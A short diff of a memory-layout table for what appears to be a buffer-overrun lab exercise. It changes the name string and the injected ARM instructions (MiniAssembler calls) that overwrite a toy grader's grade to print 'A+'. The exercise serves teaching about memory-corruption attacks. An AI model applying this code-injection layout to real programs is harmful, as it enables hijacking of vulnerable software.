@@ -152,26 +152,20 @@ Address        A Description
 
 Address        A+ Description                                  
 ------------------------------------------------------------------------
-0x420058       S
-0x420059       e
+0x420058       G
+0x420059       i
 0x42005A       a
-0x42005B       n
-0x42005C       
-0x42005D       W
-0x42005E       a
-0x42005F       n
-0x420060       g
-0x420061       \0
-0x420062       \0
-0x420063       \0
-0x420064       MiniAssembler_mov(0, 'A')
-0x420068       MiniAssembler_bl(0x400600, 0x420068);
-0x42006C       MiniAssembler_mov(0, '+');
-0x420070       MiniAssembler_bl(0x400600, 0x420070);
-0x420074       MiniAssembler_mov(0, '\0');
-0x420078       MiniAssembler_adr(1, 0x420044, 0x420078);
-0x42007C       MiniAssembler_strb(0,1);
-0x420080       MiniAssembler_b(0x400864, 0x420080);
+0x42005B       o
+0x42005C       \0
+0x42005D       A
+0x42005E       \0
+0x42005F       \0
+0x420060       MiniAssembler_adr(0, 0x42005D, 0x420060)
+0x420064       MiniAssembler_bl(0x4005e0, 0x420064);
+0x420068       MiniAssembler_mov(0, '+');
+0x42006C       MiniAssembler_adr(1, 0x420044, 0x42006C);
+0x420070       MiniAssembler_strb(0,1);
+0x420074       MiniAssembler_b(0x400864, 0x420074);
 
 
 
